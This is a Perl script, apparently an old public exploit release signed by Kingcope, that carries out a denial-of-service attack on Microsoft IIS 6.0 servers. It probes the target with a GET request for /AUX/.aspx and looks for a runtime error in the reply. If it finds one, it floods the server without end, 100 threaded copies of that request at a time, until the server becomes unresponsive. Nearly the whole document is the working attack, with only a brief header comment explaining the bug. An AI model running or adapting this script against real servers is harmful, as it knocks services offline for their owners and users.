#When sending multiple parallel GET requests to a IIS 6.0 server requesting
#/AUX/.aspx the server gets instable and non responsive. This happens only
#to servers which respond a runtime error (System.Web.HttpException)
#and take two or more seconds to respond to the /AUX/.aspx GET request.
#
#
#signed,
#Kingcope kingcope () gmx net
##########################################################################
###***********************************************************************
###
###
###
### Lame Internet Information Server 6.0 Denial Of Service (nonpermanent)
### by Kingcope, May/2007
### Better run this from a Linux system
##########################################################################

use IO::Socket;
use threads;

if ($ARGV[0] eq "") { exit; }
my $host = $ARGV[0];

$|=1;

sub sendit {
$sock = IO::Socket::INET->new(PeerAddr => $host,
                              PeerPort => 'http(80)',
                              Proto    => 'tcp');

print $sock "GET /AUX/.aspx HTTP/1.1\r\nHost:
$host\r\nConnection:close\r\n\r\n";
}

$sock = IO::Socket::INET->new(PeerAddr => $host,
                              PeerPort => 'http(80)',
                              Proto    => 'tcp');

print $sock "GET /AUX/.aspx HTTP/1.1\r\nHost:
$host\r\nConnection:close\r\n\r\n";

$k=0;
while (<$sock>) {
        if (($_ =~ /Runtime\sError/) || ($_ =~ /HttpException/)) {
                        $k=1;
                        last;
        }
}

if ($k==0) {
        print "Server does not seem vulnerable to this attack.\n";
        exit;   
}

print "ATTACK!\n";

while(1){

for (my $i=0;$i<=100;$i++) {
        $thr = threads->new(\&sendit);
        print "\r\r\r$i/100                        ";
}

foreach $thr (threads->list) {
        $thr->join;
}
}

